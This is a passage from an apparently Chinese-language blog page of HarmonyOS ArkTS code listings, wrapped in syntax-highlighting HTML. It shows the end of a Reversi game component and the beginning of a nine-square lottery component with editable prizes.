class="number">1</span>]<span class="comment">// 右下</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> direction <span class="keyword">of</span> directions) &#123;</span><br><span class="line">      <span class="keyword">let</span> foundOpposite = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">let</span> x = row;</span><br><span class="line">      <span class="keyword">let</span> y = col;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        x += direction[<span class="number">0</span>];</span><br><span class="line">        y += direction[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || y &lt; <span class="number">0</span> || x &gt;= <span class="variable language_">this</span>.<span class="property">chessBoardSize</span> || y &gt;= <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> cell = <span class="variable language_">this</span>.<span class="property">chessBoard</span>[x][y];</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === color) &#123;</span><br><span class="line">          <span class="keyword">if</span> (foundOpposite) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="attr">tempX</span>: number = x - direction[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">let</span> <span class="attr">tempY</span>: number = y - direction[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">while</span> (tempX !== row || tempY !== col) &#123;</span><br><span class="line">              reversibleTiles.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">chessBoard</span>[tempX][tempY]);</span><br><span class="line">              tempX -= direction[<span class="number">0</span>];</span><br><span class="line">              tempY -= direction[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          foundOpposite = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> reversibleTiles;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">determineWinner</span>(): string &#123;</span><br><span class="line">    <span class="keyword">let</span> blackCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> whiteCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">chessBoard</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> cell <span class="keyword">of</span> row) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === <span class="number">1</span>) &#123;</span><br><span class="line">          blackCount++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cell.<span class="property">frontVisibility</span> === <span class="number">2</span>) &#123;</span><br><span class="line">          whiteCount++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (blackCount &gt; whiteCount) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;黑棋获胜！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (whiteCount &gt; blackCount) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;白棋获胜！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;平局！&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">hasValidMove</span>(<span class="attr">color</span>: number): boolean &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">chessBoard</span>[row][col].<span class="property">frontVisibility</span> === <span class="number">0</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">findReversible</span>(row, col, color).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">``</span>)<span class="comment">// 显示单元格的值或空字符串</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 文本居中</span></span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// 设置圆角</span></span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`黑棋行动`</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`白棋行动`</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">          <span class="title class_">Text</span>()<span class="comment">// 显示单元格的值或空字符串</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 文本居中</span></span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// 设置圆角</span></span><br><span class="line">            .<span class="title function_">padding</span>(<span class="number">10</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">visibility</span>(!<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">8</span>&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">      .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="comment">//棋盘背景</span></span><br><span class="line">        <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>, <span class="function">(<span class="params">row: boolean[], _rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">item: TileHighlight, _colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item.isValidMove ? <span class="string">&#x27;+&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>)<span class="comment">// 显示单元格的值或空字符串</span></span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置宽度</span></span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置高度</span></span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 设置字体大小</span></span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 文本居中</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Gray</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">2</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">8</span>&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        <span class="comment">//棋子</span></span><br><span class="line">        <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">chessBoard</span>, <span class="function">(<span class="params">row: ChessCell[], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">chessCell: ChessCell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">``</span>)<span class="comment">// 显示单元格的值或空字符串</span></span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置宽度</span></span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>)<span class="comment">// 设置高度</span></span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>)<span class="comment">// 设置边距</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 设置字体大小</span></span><br><span class="line">                .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 文本居中</span></span><br><span class="line">                .<span class="title function_">opacity</span>(chessCell.<span class="property">opacity</span>)</span><br><span class="line">                .<span class="title function_">backgroundColor</span>(chessCell.<span class="property">frontVisibility</span> != <span class="number">0</span> ?</span><br><span class="line">                  (chessCell.<span class="property">frontVisibility</span> === <span class="number">1</span> ? <span class="title class_">Color</span>.<span class="property">Black</span> : <span class="title class_">Color</span>.<span class="property">White</span>) :</span><br><span class="line">                <span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// 设置背景颜色</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// 设置圆角</span></span><br><span class="line">                .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">                  <span class="comment">// 设置旋转</span></span><br><span class="line">                  <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">                  <span class="attr">y</span>: <span class="number">1</span>,</span><br><span class="line">                  <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">                  <span class="attr">angle</span>: chessCell.<span class="property">rotationAngle</span>, <span class="comment">// 旋转角度</span></span><br><span class="line">                  <span class="attr">centerX</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// 中心点X坐标</span></span><br><span class="line">                  <span class="attr">centerY</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// 中心点Y坐标</span></span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 单击事件处理</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAIPlaying</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`ai正在落子，玩家不可继续落子`</span>)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> (chessCell.<span class="property">frontVisibility</span> === <span class="number">0</span>) &#123; <span class="comment">// 没有棋子，需要落子</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">placeChessPiece</span>(rowIndex, colIndex, chessCell)</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">8</span>&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.isTwoPlayerMode? <span class="string">&#x27;双人游戏&#x27;</span> : <span class="string">&#x27;单人游戏&#x27;</span>&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">          .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">10</span> &#125;)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">16</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="number">0xFFFFFF</span>)</span><br><span class="line">        <span class="title class_">Toggle</span>(&#123; <span class="attr">type</span>: <span class="title class_">ToggleType</span>.<span class="property">Switch</span>, <span class="attr">isOn</span>: <span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span> &#125;)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="number">200</span>, <span class="attr">right</span>: <span class="number">10</span> &#125;)</span><br><span class="line">          .<span class="title function_">onChange</span>(<span class="function">(<span class="params">isOn: boolean</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span> = isOn</span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="number">0xFFFFFF</span>)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;重新开始&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 按钮点击事件</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">initGame</span>()</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度和宽度</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="nine-square"><a href="#nine-square" class="headerlink" title="nine-square"></a>nine-square</h1><p>九宫格抽奖</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个可观察的Prize类，用于表示奖品信息。</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Prize</span> &#123;</span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">title</span>: string <span class="comment">// 奖品标题属性，使用@Trace进行追踪以便响应式更新UI</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">color</span>: string <span class="comment">// 奖品颜色属性</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">description</span>: string <span class="comment">// 奖品描述属性</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构造函数，用来初始化新的奖品实例</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">title: string, color: string, description: string = <span class="string">&quot;&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = title <span class="comment">// 设置奖品标题</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color <span class="comment">// 设置奖品颜色</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">description</span> = description <span class="comment">// 设置奖品描述，默认为空字符串</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义MyPrizeUpdate结构组件，用于显示和编辑选中的奖品信息</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">MyPrizeUpdate</span> &#123;</span><br><span class="line">  @<span class="title class_">Consume</span> <span class="attr">selectedIndex</span>: number <span class="comment">// 当前选中的奖品索引</span></span><br><span class="line">  @<span class="title class_">Consume</span> private <span class="attr">selectionOrder</span>: number[] <span class="comment">// 保存抽奖顺序的数组</span></span><br><span class="line">  @<span class="title class_">Consume</span> private <span class="attr">prizeArray</span>: <span class="title class_">Prize</span>[] <span class="comment">// 保存所有奖品的数组</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// 创建列布局容器，设置子元素之间的间距为20px</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123; <span class="comment">// 创建行布局容器</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;标题：&#x27;</span>) <span class="comment">// 显示“标题”文本</span></span><br><span class="line">        <span class="title class_">TextInput</span>(&#123; <span class="attr">text</span>: <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">title</span> &#125;)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>) <span class="comment">// 设置输入框宽度</span></span><br><span class="line">          .<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// 监听输入框内容变化</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">title</span> = value <span class="comment">// 更新奖品标题</span></span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;描述：&#x27;</span>)</span><br><span class="line">        <span class="title class_">TextInput</span>(&#123;</span><br><span class="line">          <span class="attr">text</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[<span class="variable language_">this</span>.selectionOrder[<span class="variable language_">this</span>.selectedIndex%<span class="variable language_">this</span>.selectionOrder.length]].description&#125;</span>`</span></span><br><span class="line">        &#125;).<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>).<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// 同上，但针对奖品描述</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">description</span> = value</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;颜色：&#x27;</span>)</span><br><span class="line">        <span class="title class_">TextInput</span>(&#123;</span><br><span class="line">          <span class="attr">text</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[<span class="variable language_">this</span>.selectionOrder[<span class="variable language_">this</span>.selectedIndex%<span class="variable language_">this</span>.selectionOrder.length]].color&#125;</span>`</span></span><br><span class="line">        &#125;).<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>).<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// 同上，但针对奖品颜色</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">prizeArray</span>[<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>%<span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>]].<span class="property">color</span> = value</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Start</span>) <span class="comment">// 设置内容左对齐</span></span><br><span class="line">    .<span class="title function_">padding</span>(<span class="number">40</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度为100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置背景颜色为白色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义抽奖页面入口组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">LotteryPage</span> &#123;</span><br><span class="line">  @<span class="title class_">Provide</span> private <span class="attr">selectedIndex</span>: number = <span class="number">0</span> <span class="comment">// 提供当前选中的索引，初始值为0</span></span><br><span class="line">  private <span class="attr">isAnimating</span>: boolean = <span class="literal">false</span> <span class="comment">// 标记是否正在进行动画，初始值为false</span></span><br><span class="line">  @<span class="title class_">Provide</span> private <span 